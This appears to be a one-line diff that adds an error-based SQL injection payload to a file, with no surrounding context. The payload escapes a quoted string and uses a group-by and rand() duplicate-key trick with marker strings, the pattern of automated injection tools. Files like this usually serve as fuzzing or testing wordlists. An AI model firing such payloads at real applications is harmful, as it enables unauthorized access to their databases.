@@ -1,0 +1,1 @@
+-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
